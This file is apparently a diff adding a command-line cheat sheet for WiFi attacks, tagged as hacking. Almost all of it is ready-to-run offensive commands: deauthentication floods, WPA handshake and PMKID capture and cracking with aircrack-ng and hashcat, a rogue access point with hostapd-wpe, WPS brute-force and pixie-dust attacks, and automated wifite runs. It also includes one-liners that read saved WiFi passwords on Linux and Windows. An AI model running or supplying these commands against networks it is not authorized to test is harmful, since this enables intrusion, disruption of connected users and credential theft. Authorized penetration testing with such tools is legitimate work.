@@ -1,0 +1,89 @@
+% wireless, wifi, aircrack, wpa, hacking
+
+# Check wireless interfaces
+iwconfig
+
+# Kill interfering processes
+sudo airmon-ng check kill
+
+# Start monitor mode
+sudo airmon-ng start <interface>
+
+# Stop monitor mode
+sudo airmon-ng stop <monitor_interface>
+
+# Scan for networks
+sudo airodump-ng <monitor_interface>
+
+# Target specific network (capture handshake)
+sudo airodump-ng -c <channel> --bssid <bssid> -w <output_prefix> <monitor_interface>
+
+# Deauth attack (force handshake)
+sudo aireplay-ng -0 <count> -a <bssid> -c <client_mac> <monitor_interface>
+
+# Deauth broadcast (all clients)
+sudo aireplay-ng -0 <count> -a <bssid> <monitor_interface>
+
+# Crack WPA/WPA2 handshake
+aircrack-ng -w <wordlist> -b <bssid> <capture_file>
+
+# Crack with hashcat (faster - convert first)
+cap2hccapx <capture_file> output.hccapx
+hashcat -m 22000 output.hccapx <wordlist>
+
+# PMKID attack (no handshake needed)
+sudo hcxdumptool -i <monitor_interface> -o pmkid.pcapng --enable_status=1
+
+# Convert PMKID for hashcat
+hcxpcapngtool -o hash.22000 pmkid.pcapng
+hashcat -m 22000 hash.22000 <wordlist>
+
+# Fake AP with hostapd-wpe
+sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+
+# WPS attack with reaver
+sudo reaver -i <monitor_interface> -b <bssid> -vv
+
+# WPS attack with bully
+sudo bully -b <bssid> -c <channel> <monitor_interface>
+
+# Pixie dust attack (WPS)
+sudo reaver -i <monitor_interface> -b <bssid> -vv -K 1
+
+# Wifite - automated attacks
+sudo wifite
+
+# Wifite - WPA only
+sudo wifite --wpa
+
+# Check if handshake captured
+aircrack-ng <capture_file>
+
+# Create wordlist from AP info
+crunch 8 8 -t <ssid>%%%% -o custom_wordlist.txt
+
+# Wash - find WPS enabled APs
+sudo wash -i <monitor_interface>
+
+# Fern WiFi Cracker (GUI)
+sudo fern-wifi-cracker
+
+# Kismet - wireless detection
+kismet
+
+# Show saved WiFi passwords (Linux)
+sudo cat /etc/NetworkManager/system-connections/* | grep psk=
+
+# Show saved WiFi passwords (Windows)
+netsh wlan show profile name="<ssid>" key=clear
+
+$ interface: iw dev | grep Interface | awk '{print $2}'
+$ monitor_interface: iw dev | grep Interface | awk '{print $2}' | head -1
+$ channel: echo "1\n6\n11"
+$ bssid: echo ""
+$ client_mac: echo ""
+$ output_prefix: echo "capture"
+$ capture_file: find . -name "*.cap" -o -name "*.pcap" 2>/dev/null
+$ wordlist: echo "/usr/share/wordlists/rockyou.txt"
+$ count: echo "5\n10\n0" --- --header "0=continuous"
+$ ssid: echo ""
